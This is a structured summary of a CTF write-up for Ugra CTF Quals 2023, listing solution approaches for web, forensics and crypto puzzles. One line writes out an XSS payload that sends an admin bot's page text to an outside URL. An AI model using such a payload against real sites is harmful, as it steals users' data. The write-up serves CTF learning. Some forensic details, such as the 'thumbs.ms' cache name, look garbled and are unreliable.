...
quality: high
full_path: Ugra_CTF_Quals_2023_WP.full.md
meta_path: Ugra_CTF_Quals_2023_WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: Ugra CTF Quals 2023 WP (狼组)。俄语 Ugra 资格赛杂烩 WP，三段式 flag + XSS 偷管理员 + 缩略图取证 + Python 切片回推 + rot13 等价链。。经验：字符串/字节反转 + little-endian + sum(ord*1000**i) 是 flag 还原三大套路，几乎...
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/92675.html
reasoning_chain:
- 触发点：俄语赛题 + 多 subcategory（web/forensic/misc/crypto）+ 三段式 flag 拼接 → 假设：Ugra 风格字符串混合编码
- Трисекция：源码+robots.txt+响应头三段拼 flag → 动作：分别读源码/RobotsTXT/header → 拼接
- Старые добрые времена：<script>window.open('http://x/xss.php?msg='+encodeURI(document.body.textContent))</script> 弹窗读 body → admin bot
- Сельский блог：postid base64 解密 → 假设：参数可预测爆破 → flag{...}
- Захват трафика：HTTP 流导出图片 → 假设：内容藏在 image/png 流里
- Мультфильмы：more 命令打开文件 → 假设：文件被删/分片 → 找回
- Музыкальная пятиминутка：win10 缩略图抽 flag → 动作：thumbs.ms 数据库还原
- Бухгалтерия：Excel 求和公式填色 → 假设：lattice 模式 → 用 openpyxl 遍历
- Elementary：Python 切片 flag[9:3:-2] / flag[-2:-15:-3].hex / flag[6:18:2].from_bytes(little) / sum(ord*1000**i) 全部回推 + SHA256 双 for 爆破 flag[11],flag[13]
- Водоворот：rot13×1337=1 次 → flag{...} / Криптобаш：17 字节轮转+deadbeef XOR+反转 / Глубина：URL 路径跟随
failed_attempts:
- Трисекция 试图读任一段直接拿 flag → 失败：flag 必须三段拼接
- Elementary 试图暴力 SHA256 全字符集 → 失败：双 for 限定 flag[11],flag[13] 32-126 范围爆破
- Музыкальная 试图解析 mp3 id3 → 失败：flag 藏在 win10 缩略图 thumbs.ms 缓存
key_observations:
- 字符串/字节反转 + little-endian + sum(ord*1000**i) 是 flag 还原三大套路，几乎所有 RE-Crypto 杂项都用得上
- 俄语赛题常以 subcategory 切分多 sub-flag，每段独立工具 → 通用 string manipulation + 编码组合战
- win10 缩略图 thumbs.ms 取证常作为 MISC 入门题隐蔽点
- rot13 是 CTF 入门暗号标准，leet 数字 1337 替代字母是等效变种
- XSS 弹窗偷 body 是 admin bot 类题最常见模式
prerequisites:
- Python 切片与字节序（hex/from_bytes little-endian）
- XSS / admin bot 攻击基础
- Excel openpyxl 公式与填色 lattice
- win10 thumbs.ms 数据库取证
- SHA256 限定范围爆破技巧
---
